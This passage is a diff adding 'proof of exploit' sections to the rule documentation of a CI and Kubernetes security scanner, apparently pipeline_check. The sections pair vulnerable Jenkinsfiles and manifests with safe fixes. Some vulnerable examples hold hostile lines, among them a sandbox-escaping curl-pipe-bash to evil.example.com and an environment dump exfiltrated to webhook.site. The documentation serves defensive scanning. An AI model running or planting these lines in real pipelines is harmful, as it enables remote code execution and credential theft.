+// on every PR branch. A contributor opens a PR, the PR
+// build produces a malicious ``release.jar`` as its
+// artifact, and ``deploy`` copies and runs that jar inside
+// the controller's credential context. The deploy job
+// has no way to know the upstream artifact came from an
+// untrusted ref.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        copyArtifacts(
+          projectName: 'app-build',
+          filter: 'release.jar',
+          selector: lastSuccessful()
+        )
+        sh 'java -jar release.jar'
+      }
+    }
+  }
+}
+
+// Safe: verify a producer-signed manifest before executing
+// anything from the copied directory. The verify step must
+// come BEFORE any step that reads the artifact.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        copyArtifacts(
+          projectName: 'app-build',
+          filter: 'release.jar,release.jar.sig,manifest.sha256',
+          selector: lastSuccessful()
+        )
+        sh 'sha256sum -c manifest.sha256'
+        sh 'cosign verify-blob --signature release.jar.sig release.jar'
+        sh 'java -jar release.jar'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-013`](../providers/jenkins.md#jf-013) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7571,6 +12194,43 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``curl | bash`` install one-liner trusts
+// both the network path and the installer host. A
+// MITM or compromised endpoint runs in the build's
+// shell with the build's full credential set.
+pipeline {
+  agent any
+  stages {
+    stage('install') {
+      steps {
+        sh 'curl -fsSL https://installer.example.com/cli.sh | bash'
+      }
+    }
+  }
+}
+
+// Safe: download, verify a sha256 digest from a
+// trusted source, then execute.
+pipeline {
+  agent any
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          set -e
+          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          bash /tmp/cli.sh
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-016`](../providers/jenkins.md#jf-016) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-017 }
@@ -7582,6 +12242,42 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``docker run --privileged`` plus the
+// host Docker socket inside a Jenkins agent gives the
+// container full kernel access and the agent's
+// runtime. A compromise escapes to the agent and
+// reaches every other build on the agent.
+pipeline {
+  agent any
+  stages {
+    stage('integration') {
+      steps {
+        sh '''docker run --privileged \
+          -v /var/run/docker.sock:/var/run/docker.sock \
+          myapp:test ./integration.sh'''
+      }
+    }
+  }
+}
+
+// Safe: drop ``--privileged`` and the socket mount. If
+// the build needs to build images, use Kaniko /
+// BuildKit rootless instead.
+pipeline {
+  agent any
+  stages {
+    stage('integration') {
+      steps {
+        sh 'docker run myapp@sha256:abc123... ./integration.sh'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-017`](../providers/jenkins.md#jf-017) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7595,6 +12291,42 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: pip uses a plaintext-HTTP index and
+// ``--trusted-host`` silences hash verification.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url http://internal-pypi.example.com/simple \
+            --trusted-host internal-pypi.example.com -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+
+// Safe: HTTPS + ``--require-hashes``. Internal CA
+// installed in the agent image's trust store.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url https://internal-pypi.example.com/simple \
+            --require-hashes -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-019`: Groovy sandbox escape pattern detected <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-019 }
@@ -7604,6 +12336,50 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.
 
 **Recommendation.** Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``Runtime.getRuntime().exec(...)`` bypasses
+// the script-security sandbox and runs arbitrary commands
+// in the Jenkins controller's JVM. The controller has
+// access to every credential, every agent SSH key, every
+// configured cloud provider token — full Jenkins takeover
+// from one ``Jenkinsfile`` edit. ``@Grab`` is the same
+// vector for pulling an arbitrary Maven dependency that
+// runs as the controller.
+pipeline {
+  agent any
+  stages {
+    stage('debug') {
+      steps {
+        script {
+          def proc = Runtime.getRuntime().exec(
+            ['bash', '-c', 'curl evil.example.com/x.sh | bash']
+          )
+          proc.waitFor()
+        }
+      }
+    }
+  }
+}
+
+// Safe: use Jenkins pipeline steps for everything; they
+// run through the script-security sandbox. ``sh`` runs on
+// the agent (not the controller), so even if the body is
+// malicious, the blast radius is one agent, not the whole
+// Jenkins installation.
+pipeline {
+  agent any
+  stages {
+    stage('debug') {
+      steps {
+        sh 'env'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-019`](../providers/jenkins.md#jf-019) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7655,6 +12431,43 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``git -c http.sslverify=false clone``
+// (or ``npm config set strict-ssl false``,
+// ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables
+// certificate verification. Any network attacker MITMs
+// the registry / remote and ships substituted bytes.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh 'git -c http.sslverify=false clone https://internal/repo.git'
+      }
+    }
+  }
+}
+
+// Safe: install the missing CA into the agent's trust
+// store and keep verification on.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh '''
+          sudo cp /var/jenkins_home/ca/internal.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+          git clone https://internal/repo.git
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }
@@ -7674,6 +12487,58 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** JF-017 flags inline ``docker run`` commands. This rule targets the other privileged-mode entry point: Jenkins' Kubernetes plugin lets pipelines declare ``agent { kubernetes { yaml '''...''' } }``. A pod running with ``privileged: true`` or mounting ``hostPath: /`` gives the build container the same blast radius, container escape, node-credential theft, cross-tenant contamination on a shared cluster.
 
 **Recommendation.** Remove ``privileged: true`` from the embedded pod YAML, drop ``hostPath``/``hostNetwork``/``hostPID``/``hostIPC`` entries, and add a ``securityContext`` with ``runAsNonRoot: true`` and a ``readOnlyRootFilesystem``. If Docker-in-Docker is genuinely required, use a rootless daemon (e.g. sysbox) or run the build on a dedicated privileged pool with stricter branch protection.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: a Kubernetes agent pod template runs
+// containers as privileged and mounts hostPath. The
+// agent pod escapes to the node; the node hosts every
+// other agent pod on the cluster.
+pipeline {
+  agent {
+    kubernetes {
+      yaml '''
+        spec:
+          containers:
+            - name: dind
+              image: docker:24-dind
+              securityContext:
+                privileged: true
+              volumeMounts:
+                - name: dockersock
+                  mountPath: /var/run/docker.sock
+          volumes:
+            - name: dockersock
+              hostPath: { path: /var/run/docker.sock }
+      '''
+    }
+  }
+  stages { stage('build') { steps { sh 'docker build .' } } }
+}
+
+// Safe: rootless builder (Kaniko / BuildKit) in a
+// non-privileged container. No host path, no host
+// kernel namespace access.
+pipeline {
+  agent {
+    kubernetes {
+      yaml '''
+        spec:
+          containers:
+            - name: kaniko
+              image: gcr.io/kaniko-project/executor@sha256:abc123...
+              securityContext:
+                runAsNonRoot: true
+                runAsUser: 1000
+                allowPrivilegeEscalation: false
+                capabilities: { drop: [ALL] }
+      '''
+    }
+  }
+  stages { stage('build') { steps { sh '/kaniko/executor --context=. --destination=registry/app:tag' } } }
+}
+```
 
 **Source:** [`JF-025`](../providers/jenkins.md#jf-025) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7720,6 +12585,39 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a stage body executes a base64-decoded
+// payload, exfils to a third-party webhook, or runs a
+// known miner binary. A malicious PR (or a compromised
+// maintainer) lands the payload in the Jenkinsfile;
+// every subsequent build runs it.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+        '''
+      }
+    }
+  }
+}
+
+// Safe: the build does only what the build does. No
+// obfuscated execution, no exfil POSTs, no
+// base64 -d | sh pipelines.
+pipeline {
+  agent any
+  stages {
+    stage('build') { steps { sh 'make build' } }
+  }
+}
+```
+
 **Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-030`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-030 }
@@ -7733,6 +12631,45 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Known false positives.**
 
 - ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``eval`` on a value that came from a
+// build parameter (or any non-step source) gives the
+// value full shell-grammar reach. The same shape
+// applies to ``sh -c`` on an unquoted variable.
+pipeline {
+  agent any
+  parameters {
+    string(name: 'CMD', defaultValue: 'echo hi')
+  }
+  stages {
+    stage('dispatch') {
+      steps {
+        sh "eval $CMD"
+      }
+    }
+  }
+}
+
+// Safe: pass the parameter to a script you own as a
+// quoted argument; let the script validate against
+// an allow-list. Never eval values from parameters.
+pipeline {
+  agent any
+  parameters {
+    choice(name: 'TARGET', choices: ['staging', 'prod'])
+  }
+  stages {
+    stage('dispatch') {
+      steps {
+        sh './scripts/dispatch.sh "$TARGET"'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-030`](../providers/jenkins.md#jf-030) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7760,6 +12697,33 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 - Author-controlled environment refs like ``${env.JOB_NAME}`` or ``${env.BUILD_NUMBER}`` are intentionally not flagged, those values come from Jenkins itself, not from the triggerer. Pipelines that intentionally select agents via a vetted parameter and gate the assignment behind a Groovy validator should suppress with ``.pipelinecheckignore`` and a rationale rather than disable the rule everywhere.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``agent { label "${env.LABEL_PARAM}" }``
+// or ``agent { label "$JOB_BASE_NAME" }`` lets the
+// pusher pick which agent runs the job. A branch /
+// PR named after a privileged label routes the build
+// to an agent it was never meant to reach.
+pipeline {
+  agent { label "${env.JOB_BASE_NAME}" }
+  stages {
+    stage('deploy') { steps { sh './deploy.sh' } }
+  }
+}
+
+// Safe: pin the label to a static literal that
+// matches your runner-targeting policy. Production
+// agents should also enforce the label server-side
+// via Jenkins node config.
+pipeline {
+  agent { label 'linux-amd64' }
+  stages {
+    stage('deploy') { steps { sh './deploy.sh' } }
+  }
+}
+```
+
 **Source:** [`JF-032`](../providers/jenkins.md#jf-032) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-033`: withCredentials secret leaked via Groovy ${...} interpolation in sh step <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-033 }
@@ -7773,6 +12737,44 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Known false positives.**
 
 - Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: Groovy interpolates ``${PASSWORD}`` INTO
+// the sh body BEFORE the shell sees it. The actual
+// secret value lands in the rendered script in plain
+// view; the build log shows it verbatim because
+// Jenkins' masking only watches the env-binding name.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
+          sh "curl -H 'Authorization: Bearer ${TOKEN}' https://api.example.com"
+        }
+      }
+    }
+  }
+}
+
+// Safe: single-quote the sh body so Groovy does NOT
+// interpolate; the shell receives the literal ``$TOKEN``
+// and the env-binding masking covers the output.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
+          sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
+        }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-033`](../providers/jenkins.md#jf-033) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7788,6 +12790,50 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 - A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``password()`` build parameters are NOT
+// stored encrypted at rest; they live in the build's
+// metadata as plain text, are visible to anyone with
+// build-read, and persist for the build's full
+// retention window.
+pipeline {
+  agent any
+  parameters {
+    password(name: 'DEPLOY_KEY', defaultValue: '', description: 'production deploy key')
+  }
+  stages {
+    stage('deploy') {
+      steps { sh 'echo $DEPLOY_KEY | ./deploy.sh' }
+    }
+  }
+}
+
+// Safe: store the secret in Jenkins Credentials and
+// surface a ``credentials()`` parameter that resolves
+// at runtime. The actual value is in the encrypted
+// credentials store; the parameter is just a reference.
+pipeline {
+  agent any
+  parameters {
+    credentials(name: 'DEPLOY_KEY_ID',
+                credentialType:
+                  'org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl',
+                required: true)
+  }
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: "${params.DEPLOY_KEY_ID}", variable: 'KEY')]) {
+          sh 'echo $KEY | ./deploy.sh'
+        }
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-034`](../providers/jenkins.md#jf-034) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }
@@ -7797,6 +12843,42 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.
 
 **Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``httpRequest`` with
+// ``ignoreSslErrors: true`` disables certificate
+// verification on the request. A MITM proxy or DNS
+// hijack between Jenkins and the API endpoint
+// substitutes the response, and the build trusts
+// whatever bytes arrive.
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json',
+                    ignoreSslErrors: true
+      }
+    }
+  }
+}
+
+// Safe: keep TLS verification on. For internal APIs on
+// a private CA, install the CA into the Jenkins JVM
+// trust store via the Java keystore (cacerts).
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -7810,6 +12892,38 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: nginx:1.25`` is a mutable tag.
+# Docker Hub's nginx team rebuilds it on every point
+# release; a publisher takeover repoints the tag
+# silently and every Pod that uses it picks up the
+# substituted image on the next scheduling decision.
+apiVersion: apps/v1
+kind: Deployment
+metadata: { name: web }
+spec:
+  template:
+    spec:
+      containers:
+        - name: nginx
+          image: nginx:1.25
+
+# Safe: pin to the content-addressable digest. The
+# kubelet refuses to start the Pod if the image's
+# digest doesn't match the manifest.
+apiVersion: apps/v1
+kind: Deployment
+metadata: { name: web }
+spec:
+  template:
+    spec:
+      containers:
+        - name: nginx
+          image: nginx@sha256:abc123...   # nginx:1.25.4
+```
+
 **Source:** [`K8S-001`](../providers/kubernetes.md#k8s-001) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-002`: Pod hostNetwork: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-002 }
@@ -7821,6 +12935,35 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Recommendation.** Set ``spec.hostNetwork: false`` (the default) on every workload. ``hostNetwork: true`` puts the pod directly on the node's network namespace, exposing every host-bound listener to the container and bypassing CNI network policies.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``hostNetwork: true`` makes the Pod share
+# the node's network namespace. The Pod can sniff every
+# other Pod's traffic on the node, bind privileged
+# ports, and (via raw sockets) MITM cluster-internal
+# traffic.
+apiVersion: v1
+kind: Pod
+metadata: { name: sniffer }
+spec:
+  hostNetwork: true
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+
+# Safe: default Pod network namespace. The Pod gets a
+# CNI-managed IP and can only talk on the cluster
+# network through normal Service / Ingress paths.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+```
 
 **Source:** [`K8S-002`](../providers/kubernetes.md#k8s-002) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -7834,6 +12977,34 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``hostPID: true`` lets the Pod see every
+# process on the node. A compromise of the Pod can
+# ``ps aux`` for credentials in other containers'
+# command lines, attach a debugger to other processes,
+# or use ``nsenter`` from the host PID namespace to
+# escape into any other container.
+apiVersion: v1
+kind: Pod
+metadata: { name: debugger }
+spec:
+  hostPID: true
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+
+# Safe: default Pod PID namespace.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+```
+
 **Source:** [`K8S-003`](../providers/kubernetes.md#k8s-003) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-004`: Pod hostIPC: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-004 }
@@ -7845,6 +13016,33 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **Recommendation.** Set ``spec.hostIPC: false`` (the default) on every workload. ``hostIPC: true`` lets the container read and write the host's shared-memory segments and POSIX message queues, exposing data exchanged by every other process on the node.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``hostIPC: true`` shares the node's IPC
+# namespace. Pods on the node can read each other's
+# POSIX shared memory, semaphores, and message queues —
+# pulling secrets out of in-memory caches without
+# needing kernel-namespace bypass.
+apiVersion: v1
+kind: Pod
+metadata: { name: shared-memory-app }
+spec:
+  hostIPC: true
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+
+# Safe: default Pod IPC namespace.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+```
 
 **Source:** [`K8S-004`](../providers/kubernetes.md#k8s-004) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -7915,6 +13113,40 @@ spec:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``allowPrivilegeEscalation`` defaults to
+# ``true``. A non-root process inside the container
+# can gain elevated capabilities through suid binaries
+# (or ``setcap`` files), defeating the
+# ``runAsNonRoot`` posture.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        runAsNonRoot: true   # but no_new_privs not set
+
+# Safe: ``allowPrivilegeEscalation: false`` sets the
+# kernel's ``no_new_privs`` bit on the container's
+# processes. suid binaries no longer elevate; the
+# non-root posture is now load-bearing.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        runAsNonRoot: true
+        allowPrivilegeEscalation: false
+```
+
 **Source:** [`K8S-006`](../providers/kubernetes.md#k8s-006) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-007`: Container runAsNonRoot not true / runAsUser is 0 <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-007 }
@@ -7926,6 +13158,37 @@ spec:
 **Recommendation.** Set ``securityContext.runAsNonRoot: true`` and ``runAsUser: <non-zero UID>`` on every container, OR set the same fields at pod level so all containers inherit. Running as UID 0 inside a container makes container-escape exploits dramatically more dangerous, the attacker already has root inside the container, so any kernel CVE that matters becomes immediately exploitable.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``runAsNonRoot`` not declared (or
+# explicitly false) AND ``runAsUser`` not set lets the
+# image's default user run the container — for most
+# upstream images that's root. Any escape from the
+# container starts with UID 0 on the node.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...   # USER root in Dockerfile
+
+# Safe: explicit ``runAsNonRoot: true`` + a non-zero
+# ``runAsUser``. The kubelet refuses to start the
+# container if the image's ENTRYPOINT runs as UID 0.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+```
 
 **Source:** [`K8S-007`](../providers/kubernetes.md#k8s-007) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -7955,6 +13218,42 @@ spec:
         add: ["NET_BIND_SERVICE"]   # only if binding <1024
 
 Most stateless services need no capabilities at all. Avoid ``SYS_ADMIN`` (effectively root), ``SYS_PTRACE`` (process snooping), ``NET_ADMIN`` (raw socket access), and ``SYS_MODULE`` (kernel module loading).
+
+**Proof of exploit.**
+
+```
+# Vulnerable: no ``capabilities`` block means the
+# container starts with the default Linux capability
+# set (NET_RAW, NET_BIND_SERVICE, etc.). Worse:
+# explicitly adding NET_ADMIN / SYS_ADMIN /
+# SYS_PTRACE gives the container nearly-root reach
+# into the kernel.
+apiVersion: v1
+kind: Pod
+metadata: { name: net-tool }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        capabilities:
+          add: ["NET_ADMIN", "SYS_ADMIN"]
+
+# Safe: drop ``ALL`` capabilities, then add back ONLY
+# what the workload genuinely needs (e.g.
+# ``NET_BIND_SERVICE`` to bind port 80 as non-root).
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        capabilities:
+          drop: ["ALL"]
+          add: ["NET_BIND_SERVICE"]
+```
 
 **Source:** [`K8S-009`](../providers/kubernetes.md#k8s-009) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8127,6 +13426,47 @@ spec:
 
 **Recommendation.** Replace literal ``env[].value`` entries that hold credentials with ``env[].valueFrom.secretKeyRef`` or ``envFrom.secretRef``. A literal env value lives in the manifest YAML. It gets committed to git, surfaced by ``kubectl get pod -o yaml``, and embedded in audit logs. Externalising into a Secret (and ideally a SealedSecret / ExternalSecret / SOPS-encrypted source) keeps the value out of the manifest.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a literal credential value in a container
+# ``env`` block. The Pod manifest is in etcd; anyone
+# with ``pods/get`` on the namespace reads the value.
+# Logs that echo the env (``env``, ``printenv``,
+# ``env | curl ...``) further leak it.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          value: AKIAIOSFODNN7EXAMPLE
+        - name: AWS_SECRET_ACCESS_KEY
+          value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# Safe: reference a Kubernetes Secret via
+# ``valueFrom.secretKeyRef``. The Pod manifest carries
+# the Secret's name only; the value resolves at
+# kubelet-runtime from the cluster's Secret store.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          valueFrom:
+            secretKeyRef: { name: aws-app, key: access_key_id }
+        - name: AWS_SECRET_ACCESS_KEY
+          valueFrom:
+            secretKeyRef: { name: aws-app, key: secret_access_key }
+```
+
 **Source:** [`K8S-017`](../providers/kubernetes.md#k8s-017) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-018`: Secret stringData/data carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-018 }
@@ -8136,6 +13476,42 @@ spec:
 **How this is detected.** Walks both ``stringData`` (plain text) and ``data`` (base64). Base64-encoded values are decoded and checked for AKIA-shaped AWS keys. Credential-shaped key NAMES with any non-empty value are flagged regardless of encoding, even if the value is the literal placeholder ``REPLACE_ME``, having the name in the manifest is a maintenance footgun.
 
 **Recommendation.** A ``Kind: Secret`` manifest committed to git defeats every secret-management story Kubernetes claims to provide, the base64 encoding in ``data`` is *not* encryption. Replace with SealedSecrets (Bitnami), ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection. If the manifest must remain in git, the only acceptable contents are placeholders that are filled in by an operator at apply time.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a Kubernetes Secret with credential-shaped
+# literals in ``stringData`` (or base64'd in ``data``).
+# The Secret object is in etcd; ``kubectl get secret
+# -o yaml`` exposes the value to anyone with
+# ``secrets/get`` on the namespace. Worse, committing
